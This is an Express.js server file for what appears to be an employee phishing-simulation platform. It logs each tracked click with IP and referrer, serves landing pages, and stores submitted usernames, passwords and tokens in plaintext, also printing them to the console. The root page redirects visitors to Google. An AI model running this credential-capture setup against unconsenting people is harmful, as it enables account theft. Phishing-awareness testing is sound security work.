require('dotenv').config();
const express = require('express');
const { Employee, ClickLog, InformationData } = require('./models');
const path = require('path');
const app = express();
const port = 4000;
const bodyParser = require('body-parser');

app.use(express.static(path.join(__dirname, '../frontend/')));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());

app.get('/', (req, res) => {
    res.redirect('https://www.google.com');
});

app.post('/submit_information', async (req, res) => {
    try {
        const { username, password, token, page, campaignId } = req.body;
        console.log(req.body);
        
        await InformationData.create({
            username: username,
            password: password,
            page: page,
            token: token,
            CampaignId: campaignId
        });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error saving information data:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

app.get('/:landingPage/:campaignId/:uniqueUrl', async (req, res) => {
    const { landingPage, campaignId, uniqueUrl } = req.params;

    // Store the click information in the database
    try {
        // Check if the unique URL exists in the Employee table (which is the token column)
        const employee = await Employee.findOne({
            where: { token: uniqueUrl }
        });

        // If the unique URL does not exist in the Employee table, don't creater the ClickLog and return a 404 error
        if (employee) {
            await ClickLog.create({
                uniqueUrl: uniqueUrl,
                CampaignId: campaignId,
                ipAddress: req.ip, // Express's req.ip captures the requester's IP address
                referrer: req.get('Referrer') // The page from which the link was clicked
            });
            console.log('Click logged for valid token.');
            // After storing the click, redirect the user
            const filePath = path.join(__dirname, `../frontend/LandingPages/${landingPage}/${landingPage}.html`);
            res.sendFile(filePath, (err) => {
                if (err) {
                    console.error('Error sending file:', err);
                    res.status(404).send('Page not found');
                }
            });
        } else {
            console.log('Invalid URL:', uniqueUrl);
            res.status(404).send('Page not found');
        }
        
        
    } catch (err) {
        console.error('Error logging click:', err);
        res.redirect('https://www.google.com'); // even if the logging fails, redirect the user
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Phishing server listening at http://localhost:${port}`);
});
